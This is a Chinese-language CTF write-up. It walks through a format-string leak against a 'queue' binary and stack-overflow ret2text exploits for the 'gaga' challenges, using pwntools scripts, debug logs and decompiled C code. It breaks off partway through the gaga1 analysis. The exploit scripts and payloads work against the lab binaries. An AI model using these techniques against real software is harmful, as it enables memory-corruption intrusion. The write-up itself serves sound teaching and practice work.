
```python
from pwn import *
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

s = lambda data               :p.send(data)
sa = lambda delim,data         :p.sendafter(delim, data)
sl = lambda data               :p.sendline(data)
sla = lambda delim,data         :p.sendlineafter(delim, data)
r = lambda num=4096           :p.recv(num)
ru = lambda delims, drop=True  :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
uu64 = lambda data               :u64(data.ljust(8,'\x00'))
leak = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info               :log.success(info)
itr = lambda                    :p.interactive()

context.log_level = 'DEBUG'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

flag = ""
# 因为我写的flag是16字节，所以这里范围选择[14,16)。根据实际情况更改
for i in range(14,16):
    p = process("./queue")

    myformat = "%{j}$p".format(j=i)
    logsucc(myformat)
    sla(b'today? ', myformat.encode())
    ru(b'Oh nice, 0x')

    data = ru(b'\nsounds', drop=True)

    flag += bytes.fromhex(data.decode()).decode()[::-1]
    logsucc(flag)
    p.close()

logsucc(flag)
```

```text
root@9aea9b3d9446:/chal# python3 exp.py
[+] Starting local process './queue' argv=[b'./queue'] : pid 87
[+] %14$p
[DEBUG] Received 0x23 bytes:
b'What did you learn in class today? '
[DEBUG] Sent 0x6 bytes:
b'%14$p\n'
[DEBUG] Received 0x2f bytes:
b'Oh nice, 0x6161617b67616c66\n'
b'sounds pretty cool!'
[+] flag{aaa
[*] Process './queue' stopped with exit code 0 (pid 87)
[+] Starting local process './queue' argv=[b'./queue'] : pid 89
[+] %15$p
[DEBUG] Received 0x23 bytes:
b'What did you learn in class today? '
[DEBUG] Sent 0x6 bytes:
b'%15$p\n'
[DEBUG] Received 0x2f bytes:
b'Oh nice, 0x7d61616161616161\n'
b'sounds pretty cool!'
[+] flag{aaaaaaaaaa}
[*] Process './queue' stopped with exit code 0 (pid 89)
[+] flag{aaaaaaaaaa}
```

# 2 gaga

> Multipart challenge!
>
> Note all use essentially the same `Dockerfile`. The flags are split among all three challenges. If you are already a pwn expert, the last challenge has the entire flag.

## 2.1 运行

先看一眼`Dockerfile`，仍然需要`flag.txt`

```dockerfile
FROM pwn.red/jail

COPY --from=ubuntu:20.04 / /srv

COPY gaga2 /srv/app/run

COPY flag.txt /srv/app/flag.txt

RUN chmod 755 /srv/app/run
```

```text
root@870aeb6e392e:/chal# ls
Dockerfile  Makefile  gaga0  gaga1  gaga2
root@870aeb6e392e:/chal# echo "flag{aaaaaaaaaa}" >> flag.txt
root@870aeb6e392e:/chal# ./gaga0
Welcome to gaga!
This challenge is meant to guide you through an introduction to binary exploitation.

Right now, you are on stage0. Your goal is to redirect program control to win0, which is at address 0x401236.
Your input: aaa
root@870aeb6e392e:/chal# ./gaga1
Nice!
Now you need to call the win1 function with the correct arguments.
Your input: aaa
root@870aeb6e392e:/chal# ./gaga2
Awesome! Now there's no system(), so what will you do?!
Your input: aaa

# Canary、PIE关了，NX开了
root@870aeb6e392e:/chal# checksec --file=gaga0
[*] '/chal/gaga0'
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## 2.2 反编译&分析

### `gaga0`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[60]; // [rsp+0h] [rbp-40h] BYREF  距离rbp有0x40的长度
  __gid_t rgid; // [rsp+3Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Welcome to gaga!");
  puts("This challenge is meant to guide you through an introduction to binary exploitation.");
  printf(
    "\nRight now, you are on stage0. Your goal is to redirect program control to win0, which is at address %p.\n",
    win0);
  printf("Your input: ");
  return gets(v4); // return 输入？
}
```

根据打印提示，看看`win0`函数。如下，直接打印flag：

```c
int win0()
{
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  FILE *stream; // [rsp+88h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Error: missing flag.txt.");
    exit(1);
  }
  fgets(s, 128, stream);
  return puts(s);
}
```

那就简单了，Canary啥的都关了，最简单的ret2text。就不调试了，根据IDA的注释，偏移等于`0x40+0x8=0x48`，先用这个写exp，有问题再说。

#### exp

```python
from pwn import *
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

s = lambda data               :p.send(data)
sa = lambda delim,data         :p.sendafter(delim, data)
sl = lambda data               :p.sendline(data)
sla = lambda delim,data         :p.sendlineafter(delim, data)
r = lambda num=4096           :p.recv(num)
ru = lambda delims, drop=True  :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
uu64 = lambda data               :u64(data.ljust(8,'\x00'))
leak = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info               :log.success(info)
itr = lambda                    :p.interactive()

context.log_level = 'DEBUG'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

elf = ELF("./gaga0")
p = process("./gaga0")

logsucc(hex(elf.symbols['win0']))
payload = b'a'*0x48 + p64(elf.symbols['win0'])
sla("Your input: ", payload)

itr()
```

![image-20230709021921835](https://bbs.kanxue.com/upload/attach/202402/830671_R5SAYRMCKJ4DW45.jpg)

### `gaga1`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[60]; // [rsp+0h] [rbp-40h] BYREF
  __gid_t rgid; // [rsp+3Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Nice!");
  puts("Now you need to call the win1 function with the correct arguments.");
  printf("Your input: ");
  return gets(v4);
}
```

```c
void __fastcall win1(int a1, int a2)
{
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  FILE *stream; // [rsp+98h] [rbp-8h]

  if ( a1 == 4919 || a2 == 16705 )
  {
    stream = fopen("flag.txt", "r");
    if ( !stream )
    {
      puts("Error: missing flag.txt.");
      exit(1);
    }
    fgets(s, 128, stream);
    puts(s);
  }
}
```

和`gaga0`基本一样，只不过在外面加了个`if(a1 == 4919 || a2 == 16705)`。简单，直接把`main`的`ret`覆盖成if判断后的地址`0x401269`：
